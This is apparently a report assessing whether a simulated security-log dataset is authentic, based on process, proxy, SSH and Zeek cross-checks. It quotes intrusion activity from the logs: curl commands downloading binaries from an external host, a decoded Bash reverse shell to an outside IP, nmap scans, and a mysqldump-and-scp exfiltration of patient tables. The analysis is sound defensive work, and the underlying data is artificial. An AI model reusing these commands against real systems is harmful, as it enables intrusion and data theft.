# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Verdict Confidence:** 80
**Synthetic-Confidence Score:** 65

## Executive Summary

The records support credible hunting across a mixed fleet, and the principal process, authentication, and network lifecycles I checked are coherent. However, two connector downloads repeat a concrete split between the process writing the file and the process owning the corresponding network request, with the latter's command line also disagreeing with the proxy's requested URL; that repeated cross-source defect is the main reason I judge the data likely synthetic. The score reflects that bounded defect and a weaker file-access texture concern, rather than the suspicious activity's narrative shape or the completeness of collection.

## Evidence For Synthetic

- [contract_gap] **Repeated curl download ownership and request mismatch across Windows and Linux.** In `WS-MCHEN-01.meridianhcs.local/ecar.json`, PID 7704 starts at `2026-11-02T14:45:35.833Z` with `curl.exe -fsS -o C:\Users\marcus.chen\Downloads\connector-check.exe https://support.valeworks-health.net/tools/windows-x64/connector-check.exe`; PID 7704 owns the file creation at `14:45:37.168Z`. A separate sibling, PID 7712, starts at `14:45:37.142Z` with a command requesting only `https://support.valeworks-health.net/` through the proxy, and owns source port 57407. The native Sysmon Event 3 and Security Event 5156 both corroborate PID 7712's ownership of that port. `PROXY-01.meridianhcs.local/proxy_access.log` lines 1101–1102 attach the `/tools/windows-x64/connector-check.exe` GET to the same port and tunnel, rather than to the downloader's visible process. On `WS-LNGUYEN-01`, PIDs 2959192 and 2959193 repeat this pattern at `15:12:25–15:12:36Z`, using source port 39161 and the Linux download path. This is a positive ownership/request discrepancy across visible records, not simply a complaint that a source is absent. Configuration, command-line spoofing, or selective observations could explain individual aspects, so I do not label it an unconditional hard contradiction.
- [distribution_texture] **Mounted document activity has a repeated slow command-shell texture.** In `MAC-MROSS-02.meridianhcs.local/macos_endpoint_security.ndjson`, all seven observed `/bin/cat` executions target PDF, DOCX, or XLSX files beneath `/Volumes/`; native exec-to-exit durations range from 13.133 to 22.664 seconds, with a median of 17.752 seconds. Examples include PID 21356 reading `project-plan.pdf` at `13:37:11.223221Z`, PID 45881 reading `service-review.xlsx` at `16:05:48.670374Z`, and PID 52106 reading `project-plan.docx` at `17:10:43.520711Z`. The other Mac similarly spends 15.949 seconds in `cat .../pipeline-manifest.json` and 19.485 seconds listing its parent directory. Shell-based reads of binary office documents and repeated durations in this band are a modest behavioral texture concern, not impossible activity: slow mounted storage, output backpressure, or a script can explain them. This contributes much less than the curl mismatch.

## Evidence For Real

- **Authentication and transport pivots work.** `zeek-core/conn.json` records `10.10.1.41:60904 → 10.10.1.42:22`, UID `CYaZlN64uWT5EqoFg1I`, at epoch `1793629469.158851` (`14:24:29.158851Z`). The receiving Mac's Unified Log reports accepted keyboard-interactive/PAM authentication at `14:24:36.977642Z`, and its eCAR login follows at `14:24:38.051Z`, retaining the same source address and port. Native ES records show the intervening sshd execution chain and subsequent shell.
- **Lifecycle ordering survives identifier-based checks.** Across the 23 eCAR host streams, checks of visible process UUIDs found no file, registry, module, or flow action before its visible process creation or after its visible termination. A separate check of native Sysmon process GUIDs found no checked process-dependent rows outside their visible create/terminate interval. These are bounded checks; they do not imply every possible lifecycle relationship was validated.
- **Security log clearing is represented with the correct channel discontinuity.** On DC-01, the Security stream reaches EventRecordID 28261060 at `18:42:21.3590358Z`; Event 1102 at `18:42:22.4812446Z` has EventRecordID 1, followed by records 2 and 3. The 1102 uses the Windows Eventlog provider and `UserData/LogFileCleared`, rather than treating clearing as an ordinary Security-Auditing EventData record.
- **Network and workload volumes are differentiated.** The database sensor records 465 connections, including 296 on TCP/3306, while the core and DMZ sensors record 12,095 and 9,798 connections respectively. Core traffic rises to 3,322 connections during 14:00–14:59Z, compared with 1,627 in the preceding hour, consistent with the visible scan activity rather than a uniformly smooth background.
- **The logs contain contextual noise and ordinary operational detail.** Examples include regular sysstat cron subprocesses, sudo/PAM session records, SMB client activity, workstation browser processes, failed logons, and distinct network views. Fixed sysstat counts are consistent with a scheduled job and were not scored as synthetic.
- **The Mac distinction between policy observation and successful execution is preserved.** MAC-MROSS-01's Unified Log at `15:42:09.009673Z` reports an AppleSystemPolicy message about MeetingAssist. I did not infer execution or downstream effects from that message alone, and did not find a matching successful ES exec in the supplied native stream.

## Detailed Analysis

### Scope and method

I examined only the assigned instruction file and supplied data. I inventoried the source families, parsed the Windows XML and JSON/NDJSON streams, checked process lifetimes by durable identifiers, followed selected SSH and download pivots, and reviewed suspicious command activity against network and proxy evidence. Commands and URLs in logs were treated as data and were not executed or visited.

The visible period is approximately `2026-11-02 13:00–19:00 UTC`. There are 23 host directories with eCAR telemetry: ten have Windows Security/Sysmon streams, eleven have Linux-style syslog, and two have native macOS Endpoint Security and Unified Log streams. These include workstations, two apparent domain controllers, file, application, database, proxy, web, mail, and monitoring hosts. The internal activity uses at least `10.10.1.0/24`, `10.10.2.0/24`, `10.10.3.0/24`, and `10.10.4.0/24`; naming and network behavior support different roles, although hostnames alone do not prove them.

Actual record counts include 17,832 Windows Security events, 11,624 Sysmon events, 37,537 eCAR records, 22,358 Zeek connection records across three sensors, 4,423 syslog lines, 3,895 proxy lines, and 330 native ES records. XML line counts were not mistaken for event counts, and observations from multiple sensors were not treated as distinct underlying connections automatically.

### Hunting pivots and technical plausibility

The web host has a meaningful suspicious execution pivot at `14:20:18.319Z`: Apache's `www-data` context launches Bash with a base64-decoding pipeline. The decoded text requests a Bash reverse connection to `45.33.32.30:8443`. The endpoint flow identifies source port 45978, and `zeek-dmz/conn.json` UID `Cj2ylGB9IR03zXnHw8e` records that tuple at `14:20:29.525765Z`, with a short successful flow and bidirectional bytes. This provides a technically consistent execution-to-network lead without requiring attribution of every later suspicious action to that one short-lived shell.

Later activity includes `nmap -sn 10.10.2.0/24` and a TCP connect scan of ports 22, 80, 443, 445, and 3306. On DC-01, account-management evidence tracks `svc_dirsync` creation at `17:15:05.7022900Z`, Domain Admins membership at `17:15:12.4126853Z`, and deletion at `18:50:30.1147279Z`, retaining the account SID ending `-4193`. Those are useful stable pivots. Their presence, compactness, or ease of interpretation does not establish synthetic origin.

On DB-PROD-01 at `18:15:08.750Z`, a root SSH shell starts `mysqldump --single-transaction ehr patients insurance_claims`, followed by gzip and scp. The scp command at `18:16:02.840Z` names `/tmp/rpt_0318.sql.gz` and destination `root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`. The source flow uses port 43116; core UID `C2V5Sv1BwhhWGhZkev` and database UID `Cz4BSHE03MHBonJVl3` provide sensor-specific views. APP-INT-01 then records inbound SSH, root authentication, and the destination file at `18:16:37.169Z`. File creation is near transport completion, which is coherent. I did not treat independent sensor UIDs as a defect.

### Why the connector downloads are different

The download concern is process ownership and actual request semantics, not whether an analyst can reconstruct a convenient story. For the Windows example, the download-writing process and the network-owning process have separate eCAR UUIDs and are siblings under Explorer. The native WFP and Sysmon records confirm the network-owning PID, ruling out a simple eCAR-only PID rendering discrepancy. The proxy supplies an explicit tunnel ID (`PT-aa45ffcecd6a1d0c`), client source port 57407, and inspected executable URL, so the network-to-proxy pivot is strong.

The Linux example repeats the same separation: PID 2959192 executes the download command and creates `/tmp/connector-check`; PID 2959193 executes the root-URL proxy command and owns port 39161. Proxy tunnel `PT-be8bb5ebb1e35d95` nevertheless contains a GET for `/tools/linux-x64/connector-check`. Neither visible proxy sequence shows a root-URL GET and redirect establishing why that latter command requests the tools path. Curl normally handles its requested transfer within its own process; one independent curl invocation does not ordinarily transfer the other one's output-file ownership.

A `.curlrc`, instrumentation behavior, or deliberately misleading command-line information could complicate this interpretation, and the supplied logs cannot exclude all such explanations. The same split on two platforms is nevertheless sufficiently specific to outweigh the generally good lifecycles. I count it as one recurring family of defect, not as several independent contradictions.

### Timing, background, and limitations

Most short local Mac utility executions are fast: for example, MAC-MROSS-02's `id`, `ps`, and `pwd` complete in fractions of a second. The conspicuously slower durations are concentrated in mounted-file operations, which is why I do not claim a universal process-duration error. All seven mounted `cat` reads on that host land in a narrow tens-of-seconds band, and their use on binary office files adds a repeated shell-access texture; storage latency remains a plausible alternative explanation.

I found no basis for a volume-only synthetic finding. The endpoint feeds and selected native streams need not represent unrestricted system-wide collection. Pre-window initiators, post-window closings, missing Sysmon event families, and limited Unified Log coverage were not scored. Complete reference matching was treated as useful investigative fidelity. No conclusion relies on domain registration, copied-file timestamps, external ground truth, or a supposed requirement for an incident to contain mistakes or dead ends.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Effect on score |
|---|---|---|---|
| `contract_gap` | eCAR, Windows WFP/Sysmon, inspected proxy | Windows and Linux connector downloads | Primary indicator: output writer, socket owner, and requested URL fail to describe one consistent visible transfer. Repetition across platforms strengthens the inference, with configuration/collection caveats retained. |
| `distribution_texture` | Native macOS ES, with eCAR file context | Seven binary-document `cat` reads on one Mac, plus comparable mounted activity on the other | Small upward adjustment: repeated shell access and duration band look templated, but slow mounted storage or automation could explain them. |

No unconditional hard contradiction or generator identity leak was established. The score remains in the lower part of the “likely synthetic” band because much of the operational evidence is production-like.

## Realism Score by Category

- **Field format accuracy:** 9 — Parsed source formats are credible; native Windows clear-event structure and record-ID reset are particularly good.
- **Temporal patterns:** 8 — Major lifecycle ordering is sound; mounted-file execution durations show a limited texture concern.
- **Cross-source correlation:** 6 — SSH, scp, and most process pivots work, but the repeated curl writer/socket/request split materially weakens attribution.
- **Behavioral realism:** 7 — Plausible tradecraft and background coexist with repetitive shell reads of binary documents.
- **Environmental consistency:** 8 — Host roles and source volumes mostly fit; no unsupported platform or collection requirement was imposed.

## Recommendations

- If this were synthetic, represent each connector download with one consistent process identity owning the command, socket, and output file. Ensure the proxy's inspected path follows the URL actually requested by that process; retain any real redirect or helper behavior explicitly if it explains a change.
- If this were synthetic, vary mounted document access according to actual application or script behavior. Where `cat`, `ls`, or `tee` legitimately access mounted storage, derive their durations from the underlying transfer, storage, or output behavior instead of giving the family a repeated broad activity-duration band.
- Preserve the existing strengths: transport-before-auth ordering, process-lifetime constraints, transfer destination timing, source-specific identifiers, and Security log-clear record numbering.
